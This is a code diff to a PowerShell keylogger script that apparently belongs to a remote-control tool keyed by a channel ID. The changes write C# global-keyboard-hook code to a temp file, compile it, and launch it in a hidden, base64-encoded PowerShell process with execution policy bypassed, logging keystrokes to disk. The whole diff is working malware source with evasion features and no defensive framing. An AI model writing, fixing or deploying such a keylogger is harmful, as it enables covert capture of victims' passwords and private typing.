@@ -5,9 +5,10 @@ $logFile = "$env:TEMP\keylog_$channelID.txt"
 $errorLog = "$env:TEMP\keylog_error_$channelID.txt"
 $pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
 $readyFile = "$env:TEMP\keylog_ready_$channelID.txt"
+$csharpFile = "$env:TEMP\keylog_csharp_$channelID.cs"
 
 # Clean up previous run files
-Remove-Item $pidFile, $readyFile, $errorLog -Force -ErrorAction SilentlyContinue
+Remove-Item $pidFile, $readyFile, $errorLog, $csharpFile -Force -ErrorAction SilentlyContinue
 
 # Kill any previous keylogger process for this channel
 if (Test-Path $pidFile) {
@@ -16,7 +17,7 @@ if (Test-Path $pidFile) {
     Remove-Item $pidFile -Force
 }
 
-# C# code for global keyboard hook
+# C# code for global keyboard hook (simplified and corrected)
 $cSharpCode = @"
 using System;
 using System.Diagnostics;
@@ -38,7 +39,6 @@ public class Keylogger
         _logFile = logFile;
         _writer = new StreamWriter(logFile, true) { AutoFlush = true };
 
-        // Signal that the process has started
         string readyFile = Path.Combine(Path.GetTempPath(), "keylog_ready_" + Process.GetCurrentProcess().Id + ".txt");
         File.WriteAllText(readyFile, "ready");
 
@@ -97,24 +97,24 @@ public class Keylogger
 }
 "@
 
-# PowerShell script that will run in a separate hidden process
+# Save C# code to a temporary file for compilation
+$cSharpCode | Out-File -FilePath $csharpFile -Encoding utf8
+
+# PowerShell script to compile and run
 $psScript = @"
 try {
-    Add-Type -TypeDefinition @'
-$cSharpCode
-'@ -ReferencedAssemblies "System.Windows.Forms"
+    Add-Type -Path "$csharpFile" -ReferencedAssemblies "System.Windows.Forms" -ErrorAction Stop
     [Keylogger]::Start("$logFile")
 } catch {
-    `$errorMsg = "Keylogger failed: `$_`n`$(`$_.ScriptStackTrace)"
+    `$errorMsg = "Compilation error: `$_`n`$(`$_.ScriptStackTrace)`n`$(`$_.InvocationInfo.PositionMessage)"
     [System.IO.File]::WriteAllText("$errorLog", `$errorMsg)
 }
 "@
 
-# Encode the script as a command
+# Encode and launch hidden PowerShell process
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($psScript)
 $encodedCommand = [Convert]::ToBase64String($bytes)
 
-# Launch hidden PowerShell process
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = "powershell.exe"
 $psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
@@ -122,7 +122,7 @@ $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
 $psi.CreateNoWindow = $true
 $p = [System.Diagnostics.Process]::Start($psi)
 
-# Wait for the ready file (max 5 seconds)
+# Wait for ready file (max 5 seconds)
 $timeout = 5
 $readyPath = "$env:TEMP\keylog_ready_$($p.Id).txt"
 while ($timeout -gt 0 -and -not (Test-Path $readyPath)) {
@@ -131,7 +131,6 @@ while ($timeout -gt 0 -and -not (Test-Path $readyPath)) {
 }
 Remove-Item $readyPath -Force -ErrorAction SilentlyContinue
 
-# Check if process has already exited
 if ($p.HasExited) {
     if (Test-Path $errorLog) {
         $errorMsg = Get-Content $errorLog -Raw
@@ -140,8 +139,9 @@ if ($p.HasExited) {
     } else {
         Write-Output "Keylogger process exited unexpectedly with no error log."
     }
+    # Clean up
+    Remove-Item $csharpFile -Force -ErrorAction SilentlyContinue
 } else {
-    # Save PID for stopping later
     $p.Id | Out-File -FilePath $pidFile -Force
     Write-Output "Keylogger started with PID $($p.Id). Logging to $logFile"
 }
